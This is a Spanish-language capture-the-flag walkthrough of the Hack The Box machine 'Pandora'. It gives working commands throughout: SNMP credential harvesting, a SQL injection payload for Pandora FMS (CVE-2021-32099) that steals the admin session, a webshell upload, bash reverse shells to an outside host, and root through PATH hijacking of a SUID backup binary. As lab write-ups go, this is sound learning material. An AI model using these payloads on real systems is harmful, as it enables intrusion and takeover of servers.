
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-Volvemos a hacer un escaneo de Puertos, está vez por Puertos UDP:
	-sudo nmap -p- --open --min-rate 5000 -sS -n -Pn **-sU** 10.10.11.136
		**161/udp open  snmp**
		(Descubrimos este puerto nuevo!!)

-Usamos la Herramienta snmpwalk con los siguientes Parámetros para Enumerar todo el Servicio SNMP:
	-snmpwalk -v2c -c public 10.10.11.136
		-En las primeras lineas Encontramos unas Credenciales:
			iso.3.6.1.2.1.1.4.0 = STRING: "**Daniel**"
			iso.3.6.1.2.1.1.5.0 = STRING: "**pandora**"
			iso.3.6.1.2.1.1.6.0 = STRING: "**Mississippi**"
		-Algo más abajo Encontramos la Contraseña:
			**-u daniel -p HotelBabylon23**

-Nos conectamos por SSH con las credenciales obtenidas:
	-ssh daniel@10.10.11.136
	-Password: HotelBabylon23

-Nos vamos a la siguiente Ruta para ver la Configuración web de Apache:
	-/etc/apache2/sites-enabled
		-cat pandora.conf 
			 ServerName **pandora.panda.htb**
			  DocumentRoot /var/www/pandora
			  AssignUserID matt matt

-Hacemos un Curl al puerto 80 de Localhost para ver que está sucediendo:
	-curl localhost:80
		HTTP-EQUIV="REFRESH" content="0; **url=/pandora_console/**">

-Desde la Propia Máquina, nos está redirigiendo a /pandora_console, cosa que desde el navegador no sucede.

-Vamos a hacer un **Local Port Forwarding** para traernos el Puerto 80 a nuestra Máquina y a ver si vemos una Página Distinta.

## Local Port Forwarding - Puerto 80

ssh daniel@10.10.11.136 -L 80:127.0.0.1:80

-------------------------------------------------------------------------

-Introducimos 'http://localhost' en el navegador y nos redirige a '**/pandora_console**', dónde **vemos una nueva web.**

-Encontramos el siguiente texto en la Parte inferior de la web, parece ser la versión del Software:
	-v7.0NG.742_FIX_PERL2020

-Lo buscamos en google y encontramos varias Vulnerabilidades:
	**1-CVE-2021-32099 - SQL Injection in Artica Pandora Fms**
	**2-CVE-2020-5844  - Pandora FMS v7.0NG.742 - Remote Code Execution (RCE) (Authenticated)**

-Intentamos Ejecutar el 2 Exploit directamente, pero con nuestro usuario actual no podemos (daniel), necesitamos que sea un admin.

## SQLI - CVE-2021-32099

-Seguimos el siguiente Recurso:
	https://sploitus.com/exploit?id=BCE73B14-EA58-5EDD-9365-28E92DD00A26

-Ellos lo hacen por POST , pero nosotros vamos a probar con GET, empezamos enumerando el Número de Columnas que se están empleando:
	-http://localhost/pandora_console/include/chart_generator.php?session_id=1'order by 3-- -
		-**Tiene 3 Columnas** , ya que con 4 da Error!!

-Por desgracia, el BLIND, por lo que no refleja el Output y no podemos Enumerar nada.

-Utilizamos ahora el siguiente Recurso, el cual utiliza una QUERY que roba la Sesión del usuario Admin:
	https://github.com/ibnuuby/CVE-2021-32099

-QUERY:
	-http://localhost/pandora_console/include/chart_generator.php?session_id=a' UNION SELECT 'a',1,'id_usuario|s:5:"admin";' as data FROM tsessions_php WHERE '1'='1

-Volvemos a http://localhost/pandora_console/ y Hemos entrado como Usuario 'admin'

--------------------------------------------------------------------------

##  Pandora v7.0NG.742 (RCE) - CVE-2020-5844

-Analizamos el siguiente Exploit:
	https://www.exploit-db.com/exploits/50961

-Lo que está haciendo es irse a Admin tools --> File Manager y subir una webshell

-Lo hacemos Manual, subimos la webshell, podemos Ejecutar Comandos desde aquí:
	-http://localhost/pandora_console/images/shell.php?cmd=id
		**uid=1000(matt) gid=1000(matt) groups=1000(matt)**

-Nos mandamos una RS como el usuario 'matt':
	-http://localhost/pandora_console/images/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.24/1337 0>&1'
		**matt@pandora:/$ whoami**
			**matt**

## Escalada de Privilegios

-Buscamos por Binarios con el Permiso SUID:
	-find / -perm /4000 2>/dev/null
		**/usr/bin/pandora_backup**
		(Encontramos este Binario Personalizado)

-Probamos a ejecutarlo a ver como funciona:
	-/usr/bin/pandora_backup
		**tar:** /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied

-Parece que está usando el Binario 'tar' con la **RUTA RELATIVA**, por lo que podríamos hacer un 'Path Hijacking'

**-NOTA:** La Máquina no tiene strings, pero también se puede ver el contenido de los binarios con **'ltrace'**

### Generamos Claves para autenticarnos por SSH con MATT

**-NOTA:** Por alguna razón, si no hacemos el PATH HIJACKING desde SSH, no funciona en este máquina (No es lo habitual)

-ssh-keygen

-Las movemos al directorio /content , le damos permios 600 a id_rsa y transferimos la clave pública /home/matt/.ssh/ de la máquina víctima

## Path Hijacking - Tar

matt@pandora:/tmp$ export PATH=/tmp:$PATH
matt@pandora:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

-Creamos nuestro archivo 'tar' personalizado:
	-nano tar
		bash -c 'bash -i >& /dev/tcp/10.10.14.24/1337 0>&1'
			**root@pandora:/tmp# whoami**
				**root**













